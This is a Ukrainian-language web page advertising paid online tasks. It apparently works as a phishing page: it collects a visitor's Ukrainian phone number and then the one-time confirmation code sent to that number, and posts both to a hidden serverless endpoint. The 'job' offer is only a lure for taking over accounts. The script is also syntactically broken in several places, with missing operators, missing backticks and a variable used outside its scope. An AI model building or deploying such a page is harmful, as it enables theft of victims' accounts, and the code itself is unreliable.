<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Платимо за завдання</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(45deg, #1a1a2e, #16213e, #0f3460);
            color: #fff;
            text-align: center;
            padding: 20px;
        }

        .card {
            max-width: 400px;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(5px);
            position: relative;
            z-index: 1;
        }

        .screen {
            display: none;
        }

        .screen.active {
            display: block;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        p {
            font-size: 16px;
            margin-bottom: 20px;
            color: #ddd;
        }

        .button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 8px;
            background: linear-gradient(90deg, #ffd700, #f0b90b);
            color: #000;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
            z-index: 10;
        }

        .button:hover {
            transform: scale(1.02);
        }

        .button:disabled {
            background: #555;
            cursor: not-allowed;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .phone-input-wrapper {
            display: flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #ffd700;
            border-radius: 8px;
            padding: 10px;
        }

        .phone-prefix {
            font-size: 18px;
            color: #aaa;
            margin-right: 10px;
        }

        .input-field {
            flex: 1;
            border: none;
            background: none;
            color: #fff;
            font-size: 18px;
            outline: none;
        }

        #code-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ffd700;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 18px;
            text-align: center;
        }

        .loader {
            border: 4px solid #333;
            border-top: 4px solid #ffd700;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="card">
        <div id="welcome-screen" class="screen active">
            <h1>Платимо за завдання</h1>
            <p>Отримуй від 200 до 600 грн в день!</p>
            <button id="start-btn" class="button">Почати</button>
        </div>

        <div id="phone-screen" class="screen">
            <h1>Введіть номер телефону</h1>
            <p>Вкажіть ваш номер для авторизації.</p>
            <div class="form-group">
                <div class="phone-input-wrapper">
                    <span class="phone-prefix">+380</span>
                    <input type="tel" id="phone-input" class="input-field" placeholder="XX XX XXX XX" maxlength="12">
                </div>
            </div>
            <button id="auth-btn" class="button">Авторизуватись</button>
        </div>

<div id="code-screen" class="screen">
            <h1>Введіть код</h1>
            <p>Ми відправили код на ваш номер.</p>
            <div class="form-group">
                <input type="tel" id="code-input" maxlength="6" placeholder="_ _ _ _ _ _">
            </div>
            <button id="code-btn" class="button">Підтвердити</button>
            <div id="loader" class="loader"></div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            console.log('Страница загружена'); // Отладка

            const welcomeScreen = document.getElementById('welcome-screen');
            const phoneScreen = document.getElementById('phone-screen');
            const codeScreen = document.getElementById('code-screen');
            const startBtn = document.getElementById('start-btn');
            const authBtn = document.getElementById('auth-btn');
            const codeBtn = document.getElementById('code-btn');
            const phoneInput = document.getElementById('phone-input');
            const codeInput = document.getElementById('code-input');
            const loader = document.getElementById('loader');

            // Проверка элементов
            if (!startBtn  !welcomeScreen  !phoneScreen  !codeScreen  !authBtn  !codeBtn  !phoneInput  !codeInput  !loader) {
                console.error('Ошибка: элементы не найдены', { startBtn, welcomeScreen, phoneScreen, codeScreen, authBtn, codeBtn, phoneInput, codeInput, loader });
                alert('Ошибка загрузки страницы. Обновите страницу.');
                return;
            }

            // Кнопка "Почати"
            startBtn.addEventListener('click', () => {
                console.log('Кнопка "Почати" нажата');
                welcomeScreen.classList.remove('active');
                phoneScreen.classList.add('active');
            });

            // Кнопка "Авторизуватись"
            authBtn.addEventListener('click', async () => {
                console.log('Кнопка "Авторизуватись" нажата');
                const rawPhone = phoneInput.value.replace(/\s/g, '');
                if (rawPhone.length !== 9) {
                    alert('Введите полный номер телефона (9 цифр).');
                    return;
                }
                const userPhoneNumber = +380${rawPhone};
                authBtn.disabled = true;
                authBtn.textContent = 'Отправка...';
                try {
                    const response = await fetch('/.netlify/functions/api', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ type: 'phone', data: userPhoneNumber }),
                    });
                    if (!response.ok) throw new Error(HTTP ошибка: ${response.status});
                    console.log('Номер отправлен:', userPhoneNumber);
                    phoneScreen.classList.remove('active');
                    codeScreen.classList.add('active');
                } catch (error) {
                    console.error('Ошибка:', error);
                    alert('Ошибка отправки номера. Попробуйте снова.');
                } finally {
                    authBtn.disabled = false;
                    authBtn.textContent = 'Авторизуватись';
                }
            });

            // Кнопка "Подтвердить"
            codeBtn.addEventListener('click', async () => {
                console.log('Кнопка "Подтвердить" нажата');
                const code = codeInput.value.replace(/\s/g, '');
                if (code.length < 4) {
                    alert('Введите код (минимум 4 символа).');
                    return;
                }
                codeBtn.style.display = 'none';
                loader.style.display = 'block';

try {
                    const response = await fetch('/.netlify/functions/api', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ type: 'code', data: { phone: userPhoneNumber, code } }),
                    });
                    if (!response.ok) throw new Error(HTTP ошибка: ${response.status});
                    console.log('Код отправлен:', code);
                    document.querySelector('.card').innerHTML = '<h1>Дякуємо!</h1><p>Ваші дані відправлено.</p>';
                } catch (error) {
                    console.error('Ошибка:', error);
                    alert('Ошибка отправки кода. Попробуйте снова.');
                } finally {
                    codeBtn.style.display = 'block';
                    loader.style.display = 'none';
                }
            });

            // Форматирование номера телефона
            phoneInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                let formatted = '';
                if (value.length > 0) formatted += value.substring(0, 2);
                if (value.length > 2) formatted += ' ' + value.substring(2, 4);
                if (value.length > 4) formatted += ' ' + value.substring(4, 7);
                if (value.length > 7) formatted += ' ' + value.substring(7, 9);
                e.target.value = formatted.trim();
            });
        });
    </script>
</body>
</html>
